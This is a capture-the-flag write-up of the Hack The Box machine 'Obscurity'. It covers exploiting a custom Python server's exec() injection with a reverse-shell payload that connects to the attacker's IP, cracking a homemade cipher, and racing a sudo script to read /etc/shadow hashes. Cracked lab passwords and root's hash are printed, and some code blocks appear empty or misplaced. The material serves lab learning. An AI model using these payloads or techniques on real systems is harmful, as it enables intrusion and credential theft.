## Summary

Obscurity just retired today. I had lots of fun solving it, especially because I got to pwn so many custom applications. Its IP address is '10.10.10.168' and I added it to '/etc/hosts' as 'obscurity.htb'. Without further ado, let's jump right in!

## Scanning & SuperSecureServer.py

A light nmap scan was enough to get me started:

{% highlight bash %}

root@fury-battlestation:~/htb/blog/obscurity# nmap -sV -O obscurity.htb -oN scan.txt

Port 80 was closed, but port 8080 was opened and hosted something that identified itself as BadHTTPServer. I opened it in a browser and got the following page:

<center><img src="/images/obscurity_htb_writeup/0.png"></center>

The motto ("Security Through Obscurity") only made me more curious. I began reading the content of the page and stumbled upon the following entry:

Message to server devs: the current source code for the web server is in 'SuperSecureServer.py' in the secret development directory
{% endhighlight %}

After seeing the words 'secret development directory', I let dirb run with a lot of wordlists, but I got no results. Then, I remembered that the site uses a custom server. I tried accessing the /css direcotry, which I knew existed because I inspected the source of the front page, and got a 404 error. This made me believe that the server will return a 404 error unless the requested URI is a FILE. Luckily for me, I knew the 'SuperSecureServer.py' would be located in that direcotry, so I used wfuzz to find it:

{% highlight bash %}

{% endhighlight %}

## Exploiting SuperSecureServer.py

If you didn't already spot the vulnerability, it's probably because the source is a little long. Let me help you:

{% highlight python %}

def serveDoc(self, path, docRoot):
        path = urllib.parse.unquote(path)
        try:
            info = "output = 'Document: {}'" # Keep the output for later debug
            exec(info.format(path)) # This is how you do string formatting, right?
            cwd = os.path.dirname(os.path.realpath(__file__))
            docRoot = os.path.join(cwd, docRoot)
            if path == "/":
                path = "/index.html"
            requested = os.path.join(docRoot, path[1:])

{% endhighlight %}

The server is running exec() on a string containing the 'path' variable, which we control. As the variable is not sanitized at all, I used [shellgenerator.github.io](https://shellgenerator.github.io) and crafted the following payload:

{% highlight python %}
';s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.173",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);b='
{% endhighlight %}

In order to get my reverse shell, I urlencoded that payload using an [online tool](https://www.urlencoder.org/) and then appended it to 'obscurity.htb:8080/' (I accessed the resulting URL in a browser). This got me a reverse shell:

{% highlight bash %}

root@fury-battlestation:~/htb/blog/obscurity# nc -nvlp 443
listening on [any] 443 ...
connect to [10.10.14.173] from (UNKNOWN) [10.10.10.168] 45170
$ whoami
www-data
$ pwd
/
$ 

{% endhighlight %}

One interesting thing that I discovered during enumeration was that there was a user named robert and I was allowed to read his home directory:

{% highlight bash %}

$ cd /home/robert
$ ls -l
total 24
drwxr-xr-x 2 root   root   4096 Dec  2 09:47 BetterSSH
-rw-rw-r-- 1 robert robert   94 Sep 26 23:08 check.txt
-rw-rw-r-- 1 robert robert  185 Oct  4 15:01 out.txt
-rw-rw-r-- 1 robert robert   27 Oct  4 15:01 passwordreminder.txt
-rwxrwxr-x 1 robert robert 2514 Oct  4 14:55 SuperSecureCrypt.py
-rwx------ 1 robert robert   33 Sep 25 14:12 user.txt
$ 

{% endhighlight %}

passwordreminder.txt looked promising, but when I transferred it to my home machine I discovered it only contained non-printable ASCII characters. This made me believe it was encrypted using SuperSecureCrypt.py, which I transferred along all the other files in that directory. The source of SuperSecureCrypt.py is a little bit long, so I'll only paste the 'encrypt' function below, which was presumably used to encrypt the password:

{% highlight python %}

def encrypt(text, key):
    keylen = len(key)
    keyPos = 0
    encrypted = ""
    for x in text:
        keyChr = key[keyPos]
        newChr = ord(x)
        newChr = chr((newChr + ord(keyChr)) % 255)
        encrypted += newChr
        keyPos += 1
        keyPos = keyPos % keylen
    return encrypted

{% endhighlight %}

# Exploiting SuperSecureCrypt.py

You don't need to be a cryptography expert in order to see that the key could be calclated given we have a sample input and output. Luckily for us, the contents of check.txt give us that two files:

{% highlight bash %}

Encrypting this file with your key should result in out.txt, make sure your key is correct!

{% endhighlight %}

I made the following python script to calculate the key used to encrypt check.txt:

{% highlight python %}

a = open("check.txt", "r", encoding='UTF-8').read()
b = open("out.txt", "r", encoding='UTF-8').read()

# print(len(a), len(b))

key = ""

for i, v in enumerate(a):
	key += chr((ord(b[i]) - ord(v)) % 255)

print(key)

{% endhighlight %}

The output is the key repeated some times:

{% highlight bash %}
root@fury-battlestation:~/htb/blog/obscurity# python3 timeai.py 
alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichal
root@fury-battlestation:~/htb/blog/obscurity#
{% endhighlight %}

The key used to encrypt the file was 'alexandrovich'. I used it to decrypt passwordreminder.txt:

{% highlight bash %}

root@fury-battlestation:~/htb/blog/obscurity# python3 SuperSecureCrypt.py -d -i passwordreminder.txt -o password_out.txt -k alexandrovich

{% endhighlight %}

The password for robert was 'SecThruObsFTW'. I used ssh to connect to robert's account and get the user proof. It starts with 'e4' 😉

## Exloiting BetterSSH

After I submitted the user proof, I started enumersting the machine again. One directory in particular caught my attention: BetterSSH. However, I knew it wouldn't help me achieve root if it runs with the same permission as robert, so I started searching for ways I could make it run as root. Fortunately, the user robert can run BetterSSH with sudo without providing a password:

{% highlight bash %}
robert@obscure:~$ sudo -l
Matching Defaults entries for robert on obscure:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User robert may run the following commands on obscure:
    (ALL) NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
robert@obscure:~$
{% endhighlight %}

The sourcecode of BetterSSH.py can be found below:

{% highlight python %}
import sys
import random, string
import os
import time
import crypt
import traceback
import subprocess

path = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
session = {"user": "", "authenticated": 0}
try:
    session['user'] = input("Enter username: ")
    passW = input("Enter password: ")

    with open('/etc/shadow', 'r') as f:
        data = f.readlines()
    data = [(p.split(":") if "$" in p else None) for p in data]
    passwords = []
    for x in data:
        if not x == None:
            passwords.append(x)

    passwordFile = '\n'.join(['\n'.join(p) for p in passwords]) 
    with open('/tmp/SSH/'+path, 'w') as f:
        f.write(passwordFile)
    time.sleep(.1)
    salt = ""
    realPass = ""
    for p in passwords:
        if p[0] == session['user']:
            salt, realPass = p[1].split('$')[2:]
            break

    if salt == "":
        print("Invalid user")
        os.remove('/tmp/SSH/'+path)
        sys.exit(0)
    salt = '$6$'+salt+'$'
    realPass = salt + realPass

    hash = crypt.crypt(passW, salt)

    if hash == realPass:
        print("Authed!")
        session['authenticated'] = 1
    else:
        print("Incorrect pass")
        os.remove('/tmp/SSH/'+path)
        sys.exit(0)
    os.remove(os.path.join('/tmp/SSH/',path))
except Exception as e:
    traceback.print_exc()
    sys.exit(0)

if session['authenticated'] == 1:
    while True:
        command = input(session['user'] + "@Obscure$ ")
        cmd = ['sudo', '-u',  session['user']]
        cmd.extend(command.split(" "))
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        o,e = proc.communicate()
        print('Output: ' + o.decode('ascii'))
        print('Error: '  + e.decode('ascii')) if len(e.decode('ascii')) > 0 else print('')
{% endhighlight %}

For some reason, the binary created a file in the /tmp/SSH/ directory and printed all the password hashes and salts to that file. However, the file would get deleted in a little over 0.1s, so I couldn't read it manually. However, I was able to read it with a little bash witchery and some creativity:
1. Have two SSH sessions as robert
2. In one session, have a bash one-liner that tries to read all the files in /tmp/SSH/ continously. It will only print the file's contents; all errors should be redirected to /dev/null
3. In the other session, try to log in as a valid user, say robert. Enter a wrong password only after you started the first session.

My bash one-liner looked like this:

{% highlight bash %}

while true; do cat /tmp/SSH/* 2>/dev/null; done

{% endhighlight %}

On the other terminal, I ran the following commands:

{% highlight bash %}

robert@obscure:~$ mkdir /tmp/SSH # for some reason the directory doesn't exist
robert@obscure:~$ sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
Enter username: robert
Enter password: wrong_password
Incorrect pass
robert@obscure:~$ 

{% endhighlight %}

The following output was printed a lot of times in the first terminal:

{% highlight bash %}

Root's /etc/shadow entry can be obtained by joining the lines below root (until 'robert') with ':'. The /etc/passwd file is readable by everyone, so I used john to crack root's password:

root@fury-battlestation:~/htb/blog/obscurity# echo "root:\$6\$riekpK4m\$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1:18226:0:99999:7:::" > ./shadow

The password for root was 'mercedes'. Root SSH login was disabled for obvious reasons (we don't want people to suceed in bruteforcing root's SSH password and get all the proofs without them solving the box), so I used 'su' while logged in as robert to get root:

{% highlight bash %}

robert@obscure:~$ su
Password: 
root@obscure:/home/robert# wc ~/root.txt
 1  1 33 /root/root.txt
root@obscure:/home/robert#

{% endhighlight %}

The root proof starts with ‘51’ 😉
